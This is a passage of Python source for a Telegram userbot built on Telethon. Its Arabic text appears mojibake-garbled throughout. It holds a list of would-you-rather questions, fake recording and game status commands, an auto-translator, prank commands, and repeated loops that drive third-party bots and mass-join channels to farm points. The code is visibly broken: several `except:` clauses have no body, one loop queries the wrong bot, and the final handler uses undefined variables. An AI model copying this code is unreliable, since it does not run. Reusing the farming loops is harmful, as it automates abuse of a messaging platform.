    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßÿ±ÿ™ÿØÿßÿ° ŸÖŸÑÿßÿ®ÿ≥ ÿßŸÑÿ®Ÿäÿ™ ŸÑŸÖÿØÿ© ÿ£ÿ≥ÿ®Ÿàÿπ ŸÉÿßŸÖŸÑ ÿ£Ÿà ÿßÿ±ÿ™ÿØÿßÿ° ÿßŸÑÿ®ÿØŸÑÿ© ÿßŸÑÿ±ÿ≥ŸÖŸäÿ© ŸÑŸÜŸÅÿ≥ ÿßŸÑŸÖÿØÿ©ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ŸÜ ÿ™ÿ™ŸÉŸÑŸÖ ÿ®ÿßŸÑŸáŸÖÿ≥ ŸÅŸÇÿ∑ ÿ∑ŸàÿßŸÑ ÿßŸÑŸàŸÇÿ™ ÿ£Ÿà ÿ£ŸÜ ÿ™ÿµÿ±ÿÆ ŸÅŸÇÿ∑ ÿ∑ŸàÿßŸÑ ÿßŸÑŸàŸÇÿ™ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ÿ•ŸÜŸÇÿßÿ∞ ÿ¥ÿÆÿµ Ÿàÿßÿ≠ÿØ ŸÖÿπ ŸÜŸÅÿ≥ŸÉ ÿ®ŸäŸÜ ÿ£ŸÖŸÉ ÿ£Ÿà ÿßÿ®ŸÜŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÑÿ®ŸÇÿßÿ° ÿ®ÿØŸàŸÜ Ÿáÿßÿ™ŸÅ ŸÑŸÖÿØÿ© ÿ¥Ÿáÿ± ÿ£Ÿà ÿ®ÿØŸàŸÜ ÿ•ŸÜÿ™ÿ±ŸÜÿ™ ŸÑŸÖÿØÿ© ÿ£ÿ≥ÿ®Ÿàÿπÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ±ÿ¨ŸÑ ÿ£ÿπŸÖÿßŸÑ ÿ£Ÿà ÿ£ŸÖŸäÿ±ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ™ŸÜÿ∏ŸäŸÅ ÿ¥ÿπÿ±ŸÉ ÿ®ÿ≥ÿßÿ¶ŸÑ ÿ∫ÿ≥ŸäŸÑ ÿßŸÑÿ£ÿ∑ÿ®ÿßŸÇ Ÿàÿ®ŸäŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÉÿ±ŸäŸÖ ÿßŸÑÿ£ÿ≥ÿßÿ≥ ŸÑÿ∫ÿ≥ŸäŸÑ ÿßŸÑÿ£ÿ∑ÿ®ÿßŸÇÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÖÿ¥ÿßŸáÿØÿ© ÿßŸÑÿØÿ±ÿßŸÖÿß ŸÅŸä ÿ£ŸäÿßŸÖ ÿßŸÑÿ≥ÿ®ÿπŸäŸÜŸäÿßÿ™ ÿ£Ÿà ŸÖÿ¥ÿßŸáÿØÿ© ÿßŸÑÿ£ÿπŸÖÿßŸÑ ÿßŸÑÿØÿ±ÿßŸÖŸäÿ© ŸÑŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸäÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÖÿ™ŸÑÿßŸÉ ÿßŸÑŸÇÿØÿ±ÿ© ÿπŸÑŸâ ÿ™ÿ∫ŸäŸäÿ± ŸÑŸàŸÜ ÿ¥ÿπÿ±ŸÉ ŸÖÿ™Ÿâ ÿ™ÿ±ŸäÿØŸäŸÜ Ÿàÿ®ŸäŸÜ ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ŸÖŸÉŸäÿßÿ¨ ŸÖŸÜ ŸÇÿ®ŸÑ ÿÆÿ®Ÿäÿ± ÿ™ÿ¨ŸÖŸäŸÑ Ÿàÿ∞ŸÑŸÉ ÿ®ÿ¥ŸÉŸÑ ŸäŸàŸÖŸäÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÑÿ•ÿ®ÿ≠ÿßÿ± ŸÑŸÖÿØÿ© ÿ£ÿ≥ÿ®Ÿàÿπ ŸÉÿßŸÖŸÑ ÿ£Ÿà ÿßŸÑÿ≥ŸÅÿ± ÿπŸÑŸâ ŸÖÿ™ŸÜ ÿ∑ÿßÿ¶ÿ±ÿ© ŸÑŸÄ 3 ÿ£ŸäÿßŸÖ ŸÖÿ™ŸàÿßÿµŸÑÿ©ÿü! **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ŸÜ ÿ™ÿµÿ®ÿ≠Ÿä ÿπÿßÿ±ÿ∂ÿ© ÿ£ÿ≤Ÿäÿßÿ° Ÿàÿ®ŸäŸÜ ŸÖŸäŸÉ ÿ¢ÿ® ÿ£ÿ±ÿ™Ÿäÿ≥ÿ™ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ™ŸÜÿßŸàŸÑ ÿßŸÑÿ¥ŸàŸÉŸàŸÑÿß ÿßŸÑÿ™Ÿä ÿ™ÿ≠ÿ®ŸäŸÜ ÿ∑ŸàÿßŸÑ ÿ≠Ÿäÿßÿ™ŸÉ ŸàŸÑŸÉŸÜ ŸÑÿß ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸâ Ÿàÿ®ŸäŸÜ ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸâ ŸàŸÑŸÉŸÜ ŸÑÿß ŸäŸÖŸÉŸÜ ŸÑŸÉ ÿ™ŸÜÿßŸàŸÑ ÿßŸÑÿ¥ŸàŸÉŸàŸÑÿß ÿ£ÿ®ÿØŸãÿßÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ≤Ÿàÿ¨ÿ™ŸÉ Ÿàÿßÿ®ŸÜŸÉ/ÿßÿ®ŸÜÿ™ŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ•ŸÖÿß ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿßŸÑŸÖÿßŸÑ ÿ£Ÿà ÿπŸÑŸâ ÿßŸÑŸÖÿ≤ŸäÿØ ŸÖŸÜ ÿßŸÑŸàŸÇÿ™ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ¥ÿ±ÿßÿ° ŸÖŸÜÿ≤ŸÑ ÿµÿ∫Ÿäÿ± ÿ£Ÿà ÿßÿ≥ÿ™ÿ¶ÿ¨ÿßÿ± ŸÅŸäŸÑÿß ŸÉÿ®Ÿäÿ±ÿ© ÿ®ŸÖÿ®ŸÑÿ∫ ŸÖÿπŸÇŸàŸÑÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ŸÖŸÉ Ÿàÿ£ÿ®ŸäŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ•ŸÜŸáÿßÿ° ÿßŸÑÿ≠ÿ±Ÿàÿ® ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖ ÿ£Ÿà ÿ•ŸÜŸáÿßÿ° ÿßŸÑÿ¨Ÿàÿπ ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÜÿ¥ÿ± ÿ™ŸÅÿßÿµŸäŸÑ ÿ≠Ÿäÿßÿ™ŸÉ ÿßŸÑŸÖÿßŸÑŸäÿ© Ÿàÿ®ŸäŸÜ ŸÜÿ¥ÿ± ÿ™ŸÅÿßÿµŸäŸÑ ÿ≠Ÿäÿßÿ™ŸÉ ÿßŸÑÿπÿßÿ∑ŸÅŸäÿ©ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÇÿ∂ÿßÿ° ŸäŸàŸÖ ŸÉÿßŸÖŸÑ ŸÖÿπ ÿßŸÑÿ±Ÿäÿßÿ∂Ÿä ÿßŸÑÿ∞Ÿä ÿ™ÿ¥ÿ¨ÿπŸá ÿ£Ÿà ŸÜÿ¨ŸÖ ÿßŸÑÿ≥ŸäŸÜŸÖÿß ÿßŸÑÿ∞Ÿä ÿ™ÿ≠ÿ®Ÿáÿü **",

]


@client.on(events.NewMessage(pattern=".ÿÆŸäÿ±ŸàŸÉ$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_5erok))

@client.on(events.NewMessage(pattern=".ÿµŸàÿ™Ÿäÿ©(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™Ÿäÿ© ÿßŸÑŸàŸáŸÖŸäÿ© ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "record-audio"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern=".ŸÅŸäÿØ(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑŸàŸáŸÖŸä ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "record-video"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern=".ŸÑÿπÿ®ÿ©(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßŸÑŸÑÿπÿ® ÿßŸÑŸàŸáŸÖŸä ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "game"):
        await asyncio.sleep(t)

translator = Translator()

tr_status = {}

@client.on(events.NewMessage(outgoing=True, pattern=".ŸÖÿ™ÿ±ÿ¨ŸÖ (.*)"))
async def start_translate(event):
    if event.fwd_from:
        return
    lang = event.pattern_match.group(1).strip()
    chat_id = event.chat_id
    tr_status[chat_id] = lang
    await event.edit(f"**ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑŸÖÿ™ÿ±ÿ¨ŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÑÿ∫ÿ©: {lang}**", parse_mode="md")

@client.on(events.NewMessage)
async def auto_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        lang = tr_status[chat_id]
        try:
            translated = await translator.translate(event.message.message, dest=lang)
            await event.edit(translated.text, parse_mode="md")
        except Exception as exc:
            print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ©: {exc}")

@client.on(events.NewMessage(outgoing=True, pattern='.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ±'))
async def stop_final(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    global final
    final = False
    await event.edit("**‚ñ™Ô∏é|ÿ™ŸÖ ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸÜÿ¨ÿßÿ≠.**", parse_mode="md")


@client.on(events.NewMessage(pattern=".ÿ∑ŸÑÿßŸÉ(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    
    if user.id == 6383191007:
        await event.respond("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
        return

    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    
    await edit_or_reply(event, f"**‚éôÔ∏ô ÿßŸÜÿ™Ÿê ÿ∑ÿßŸÑŸÇ ÿ∑ÿßŸÑŸÇ ÿ∑ÿßŸÑŸÇ üôéüèª‚Äç‚ôÇÔ∏è ŸÖŸÜ :** {my_mention} .\n**‚éôÔ∏ô ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ŸÑÿßŸÇŸáÿß ÿ®ÿßŸÑÿ´ŸÑÿßÿ´ ŸàŸÅÿ≥ÿÆ ÿ≤Ÿàÿßÿ¨ŸÉŸÖÿßÿå ÿßŸÑÿ¢ŸÜ ÿßŸÑŸÉŸÑ ÿ≠ÿ± ÿ∑ŸÑŸäŸÇ.**")              
           
@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.ŸÅÿßŸÉ$"))
async def fuck(event):
	await event.edit("‚îè‚îÅ‚î≥‚î≥‚î≥‚îÅ‚î≥‚î≥‚îì\n‚îÉ‚îÅ‚î´‚îÉ‚îÉ‚îè‚î´‚îÅ‚î´‚îè‚îì\n‚îÉ‚îè‚î´‚îÉ‚îÉ‚îó‚î´‚îÉ‚îÉ‚îÉ‚îÉ\n‚îó‚îõ‚îó‚îÅ‚îª‚îÅ‚îª‚îª‚îõ‚îÉ‚îÉ\n‚îè‚î≥‚î≥‚îÅ‚î≥‚î≥‚î≥‚îì‚îè‚î´‚î£‚î≥‚îì\n‚î£‚îì‚îÉ‚îÉ‚îÉ‚îÉ‚î£‚î´‚îÉ‚îè‚îª‚îª‚î´\n‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚î£‚îª‚î´‚îÉ‚îÉ\n‚îó‚îÅ‚îª‚îÅ‚îª‚îÅ‚îª‚îõ‚îó‚îÅ‚îÅ‚îÅ‚îõ")

@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.ÿßÿ®ÿ±Ÿá$"))
async def fuck(event):
	await event.edit(f"‚îÄ‚îÄ‚îÄ‚îÄ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚îÄ‚ñà\n‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñÄ‚ñà\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚îÄ‚ñÄ\n\n")
	

c = requests.session()
JoKeRUB = ['yes']
its_Reham = False
its_hussein = False
its_reda = False
its_joker = False

@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ CR7|ÿ™ÿ¨ŸÖŸäÿπ ŸÉÿ±ÿ≥ÿ™ŸäÿßŸÜŸà)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ CR7 , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@PPAHSBOT')
    await event.client.send_message('@PPAHSBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  
    
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿ±ÿ®|ÿ™ÿ¨ŸÖŸäÿπ ÿπŸÇÿ±ÿ®)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿπŸÇÿ±ÿ® , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@AL2QRPBOT')
    await event.client.send_message('@AL2QRPBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            msg2 = await event.client.get_messages('@AL2QRPBOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  
    
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸàŸÉÿ±|ÿ™ÿ¨ŸÖŸäÿπ ÿ¨ŸàŸÉÿ±)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿ¨ŸàŸÉÿ± , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@A_MAN9300BOT')
    await event.client.send_message('@A_MAN9300BOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  
   
@client.on(events.NewMessage(pattern="(ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸÑŸäÿßÿ±|.ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸÑŸäÿßÿ±)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑŸÖŸÑŸäÿßÿ± , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    await asyncio.sleep(4)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
